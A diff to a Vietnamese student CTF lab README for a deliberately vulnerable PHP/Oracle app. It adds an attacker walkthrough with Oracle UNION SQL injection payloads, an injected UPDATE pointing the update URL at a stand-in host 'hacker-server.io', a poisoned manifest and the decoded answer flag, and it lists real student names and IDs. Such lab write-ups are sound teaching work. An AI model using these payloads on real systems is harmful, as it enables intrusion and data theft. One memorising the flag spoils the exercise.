@@ -15,13 +15,13 @@
 
 ## THÀNH VIÊN NHÓM
 
-| STT | Họ và tên | MSSV | Vai trò |
-|-----|-----------|------|---------|
-| 1 | *(Thành viên 1)* | *(MSSV)* | Nhóm trưởng, kiến trúc hệ thống, báo cáo |
-| 2 | *(Thành viên 2)* | *(MSSV)* | Backend PHP, web application |
-| 3 | *(Thành viên 3)* | *(MSSV)* | Oracle Database, schema, seed data |
-| 4 | *(Thành viên 4)* | *(MSSV)* | Security testing, khai thác, thiết kế flag |
-| 5 | *(Thành viên 5)* | *(MSSV)* | Triển khai, setup.sh, tài liệu |
+| STT | Họ và tên        | MSSV     |
+|-----|------------------|----------|
+| 1   | Nguyen Nam Khanh | HE191159 | 
+| 2   | Nguyen Hai Anh   | HE172727 | 
+| 3   | Nguyen Cong Tien | HE180928 | 
+| 4   | Nguyen Huu Phuc  | HE181521 | 
+
 
 **Giảng viên hướng dẫn:** *(Tên giảng viên)*
 
@@ -107,11 +107,11 @@ Toàn bộ dự án hoạt động trong môi trường **lab học tập nội 
                          ▼
 ┌─────────────────────────────────────────────────────────┐
 │                  PHP 8.1 Backend                        │
-│  ┌─────────┐  ┌──────────┐  ┌───────────┐  ┌────────┐  │
+│  ┌──────────┐  ┌──────────┐  ┌───────────┐  ┌────────┐  │
 │  │config.php│  │search.php│  │transcript │  │secret_ │  │
-│  │(session) │  │(Vuln 1) │  │.php(Vuln2)│  │check   │  │
-│  └─────────┘  └──────────┘  └───────────┘  │(Vuln 3)│  │
-│                                              └────────┘  │
+│  │(session) │  │(Vuln 1)  │  │.php(Vuln2)│  │check   │  │
+│  └──────────┘  └──────────┘  └───────────┘  │(Vuln 3)│  │
+│                                             └────────┘  │
 └────────────────────────┬────────────────────────────────┘
                          │ OCI8 oci_connect()
                          ▼
@@ -125,9 +125,9 @@ Toàn bộ dự án hoạt động trong môi trường **lab học tập nội 
 │          Oracle Database XE 21c / 23c Free              │
 │  User: DBS401_USER  │  Service: XE                      │
 │  ┌────────────────────────────────────────────────────┐ │
-│  │ USERS │ STUDENTS │ COURSES │ ENROLLMENTS            │ │
-│  │ AUDIT_LOGS │ FLAGS │ ADMIN_SECRETS │ CONFIG_STORE   │ │
-│  │ FAKE_FLAGS │ SYSTEM_HINTS │ FLAG_ARCHIVE            │ │
+│  │ USERS │ STUDENTS │ COURSES │ ENROLLMENTS           │ │
+│  │ AUDIT_LOGS │ FLAGS │ ADMIN_SECRETS │ CONFIG_STORE  │ │
+│  │ FAKE_FLAGS │ SYSTEM_HINTS │ FLAG_ARCHIVE           │ │
 │  └────────────────────────────────────────────────────┘ │
 └─────────────────────────────────────────────────────────┘
 ```
@@ -159,7 +159,6 @@ Hệ thống được thiết kế dựa trên việc xác định các tài s�
 
 **Điểm đặt lỗ hổng cố ý:**
 - `search.php`: Tham số `?q=` không được parameterize → SQLi
-- `transcript.php`: Tham số `?ref=` không kiểm tra ownership → IDOR
 - `store.php`: Lỗi logic mua hàng với số lượng âm → Business Logic Attack
 - `admin.php`: Tin tưởng URL cập nhật từ DB → Supply Chain Attack
 
@@ -414,6 +413,96 @@ Kẻ tấn công có thể chiếm quyền điều khiển luồng cập nhật 
 5. Hệ thống tải manifest độc hại, thông báo cập nhật thành công và hiển thị Flag 3.
 6. Giải mã chuỗi Hex thu được để có Flag hoàn chỉnh.
 
+**Bổ sung hướng dẫn step – by – step quy trình 1 hacker khai thác vulnerabitly 3:**
+
+**Giai đoạn 1: Thăm dò và Phát hiện (Reconnaissance)**
+
+**1. Phát hiện tính năng:** Hacker truy cập admin.php và thấy nút **"Check for Partner Updates"**.
+
+* **Hành động:** Bật Burp Suite, nhấn nút.
+* **Kết quả:** Hệ thống báo *"System is up to date (Current: 3.1.0, Partner: 3.0.5)"*.
+* **Suy luận:** Có một cơ chế so sánh phiên bản. Flag có thể hiện ra nếu Partner Version > Current Version (đây là bước khó nhất vì phải có tư duy hệ thống).
+
+**2. Bắt gói tin (Interception):** Kiểm tra HTTP History trong Burp Suite.
+
+* Hacker thấy server gửi request đến http://127.0.0.1:8081/manifest.json.
+* **Suy luận:** Server lấy cấu hình từ một URL. URL này chắc chắn nằm trong Database.
+
+**Giai đoạn 2: Khai thác SQL Injection để lục tìm cấu hình (Database Enumeration)**
+
+Hacker quay lại search.php để tìm xem cái URL kia trốn ở đâu.
+
+**1. Xác định số lượng cột:**
+
+* **Câu lệnh:** ' UNION SELECT NULL, NULL, NULL FROM DUAL--
+* **Giải thích:** Hacker thử dùng NULL vì nó khớp với mọi kiểu dữ liệu. Khi nhập 3 NULL, trang web hiện ra 1 dòng trống => Xác nhận bảng gốc có **3 cột**.
+
+**2. Tìm tên bảng (Table Enumeration):**
+
+* **Câu lệnh:** ' UNION SELECT 1, table\_name, NULL FROM USER\_TABLES WHERE table\_name LIKE '%CONFIG%'--
+* **Giải thích:**
+* Sử dụng 1 (số) ở cột 1 vì cột gốc (student\_id) là kiểu NUMBER. Nếu dùng chữ sẽ lỗi.
+* Sử dụng table\_name ở cột 2 vì cột gốc (full\_name) là kiểu VARCHAR2.
+* Sử dụng NULL ở cột 3 cho rảnh tay.
+* LIKE '%CONFIG%': Tìm các bảng có tên liên quan đến cấu hình.
+* **Kết quả:** Tìm thấy bảng CONFIG\_STORE.
+
+**3. Tìm tên cột (Column Enumeration):**
+
+* **Câu lệnh:** ' UNION SELECT 1, column\_name, NULL FROM USER\_TAB\_COLUMNS WHERE table\_name='CONFIG\_STORE'--
+* **Kết quả:** Thấy các cột CONFIG\_KEY, CONFIG\_VALUE, IS\_PUBLIC.
+
+**4. Trích xuất URL mục tiêu:**
+
+* **Câu lệnh:** ' UNION SELECT 1, config\_key, config\_value FROM CONFIG\_STORE WHERE config\_key LIKE '%url%'--
+* **Kết quả:** update\_url = http://127.0.0.1:8081/manifest.json.
+
+**Giai đoạn 3: Đối đầu với "Bẫy" (Handling Fake Flags & Decoys)**
+
+Trong quá trình lục lọi, hacker sẽ gặp các thông tin giả:
+
+* **Bảng FLAG\_ARCHIVE:** Hacker có thể thấy bảng này và tưởng là nơi chứa flag thật. Nhưng khi SELECT, dữ liệu toàn là DBS401{FAKE\_...}.
+* **Bảng FAKE\_FLAGS:** Chứa hàng loạt flag giả để đánh lừa các script scan tự động.
+* **oracle\_flag\_3\_backup:** Trong bảng ADMIN\_SECRETS, hacker thấy khóa này nhưng is\_active = 0. Nếu mất thời gian giải mã Blind SQLi vào đây, họ sẽ chỉ nhận được flag giả.
+
+**Chiến thuật của Hacker:** Luôn bám sát luồng xử lý của tính năng (Update) thay vì đi lang thang tìm các bảng có chữ "Flag".
+
+**Giai đoạn 4: Phân tích Đối tác và Chuẩn bị Payload (The JSON Trap)**
+
+1. **Lấy Flag gốc:** Hacker truy cập trực tiếp http://127.0.0.1:8081/manifest.json.
+   * **Kết quả:** {"version":"3.0.5", "flag\_part":"44425334..."}.
+   * **Vấn đề:** Flag này đang bị "khóa" bởi logic 3.0.5 < 3.1.0.
+2. **Viết file JSON độc hại (evil.json):** Hacker tạo một file trên server của mình (hacker-server.io):
+
+json
+
+{
+
+"version": "9.9.9",
+
+"status": "critical",
+
+"flag\_part": "4442533430317b3575707031795f436834316e5f50303135306e316e675f303931327d"
+
+}
+
+  + **Tại sao có status?** Để giả dạng giống hệt file gốc, tránh bị admin nghi ngờ nếu họ xem log.
+  + **Tại sao 9.9.9?** Để chắc chắn vượt qua hàm version\_compare của hệ thống.
+  + **“flag\_part”:** Lấy từ phần flag\_part trả về khi truy cập trực tiếp vào manifest.json.
+
+**Giai đoạn 5: Tấn công Supply Chain (Poisoning)**
+
+1. **Thực hiện lệnh UPDATE:** Hacker dùng SQL Injection để đổi URL tin cậy: UPDATE CONFIG\_STORE SET config\_value = 'http://hacker-server.io/evil.json' WHERE config\_key = 'update\_url' *(Trong thực tế Lab, bước này chứng minh hacker đã kiểm soát được cấu hình hệ thống).*
+2. **Kích hoạt hệ thống:** Admin (hoặc hacker) nhấn "Check for Partner Updates" trong admin.php.
+   * **Hệ thống:** "Ồ, có bản 9.9.9 mới từ đối tác (thực ra là hacker)!"
+   * **Hành động:** Hệ thống tải file JSON về, thấy version hợp lệ => Phun chuỗi flag\_part ra màn hình.
+
+**Giai đoạn 6: Capture & Decode**
+
+1. **Xác nhận:** Trên giao diện hiện ra mã Hex.
+2. **Giải mã:** Hacker dùng tool đổi Hex sang ASCII.
+   * 4442... => **DBS401{5upp1y\_Ch41n\_P0150n1ng\_0912}**
+
 #### Vì sao flag Very Hard
 
 - Không có output trực tiếp → bắt buộc dùng boolean inference.
@@ -529,21 +618,10 @@ sudo bash setup.sh
 
 ---
 
-## 9. PHÂN CÔNG CÔNG VIỆC
 
-| Thành viên | Nhiệm vụ | Chi tiết |
-|-----------|---------|---------|
-| **Member 1** (Nhóm trưởng) | System design + Report | Thiết kế kiến trúc tổng thể, viết báo cáo, điều phối nhóm |
-| **Member 2** | Backend PHP | Viết toàn bộ source PHP: login, dashboard, search, transcript, admin, secret_check |
-| **Member 3** | Oracle Database | Thiết kế schema, viết seed data, tạo flag data, quản lý DB user |
-| **Member 4** | Security + CTF Design | Thiết kế 3 lỗ hổng, flag logic, fake flags, ANSWER_KEY, script exploit |
-| **Member 5** | Deployment + Docs | setup.sh, README, hướng dẫn cài đặt, troubleshooting, demo |
+## 9. KẾT LUẬN
 
----
-
-## 10. KẾT LUẬN
-
-### 10.1 Những gì đã học được
+### 9.1 Những gì đã học được
 
 Qua quá trình thực hiện đồ án, nhóm đã học được:
 
@@ -553,14 +631,14 @@ Qua quá trình thực hiện đồ án, nhóm đã học được:
 - **Oracle OCI8:** Cách sử dụng bind variables trong PHP-Oracle để phòng tránh SQLi.
 - **CTF Design:** Thiết kế hệ thống flag phức tạp với nhiều lớp encoding và decoy.
 
-### 10.2 Khó khăn gặp phải
+### 9.2 Khó khăn gặp phải
 
 - Cài đặt Oracle XE trên Ubuntu phức tạp hơn MySQL/PostgreSQL nhiều.
 - OCI8 extension cần cài thủ công và phụ thuộc Oracle Instant Client.
 - Oracle SQL syntax khác biệt (không có `LIMIT`, dùng `ROWNUM`; không có `INFORMATION_SCHEMA`, dùng `USER_TABLES`).
 - Cân bằng độ khó CTF giữa 3 flag để đảm bảo cả 3 đều Very Hard.
 
-### 10.3 Hướng phát triển
+### 9.3 Hướng phát triển
 
 - Bổ sung thêm lỗ hổng: Time-Based Blind SQLi, Oracle XML Injection, Privilege Escalation.
 - Tích hợp WAF (Web Application Firewall) demo để so sánh hiệu quả.
@@ -569,7 +647,7 @@ Qua quá trình thực hiện đồ án, nhóm đã học được:
 
 ---
 
-## 11. TÀI LIỆU THAM KHẢO
+## 10. TÀI LIỆU THAM KHẢO
 
 1. OWASP Foundation. (2021). *OWASP Top 10:2021 – A03 Injection*. https://owasp.org/Top10/A03_2021-Injection/
 2. OWASP Foundation. (2021). *OWASP Top 10:2021 – A01 Broken Access Control*. https://owasp.org/Top10/A01_2021-Broken_Access_Control/
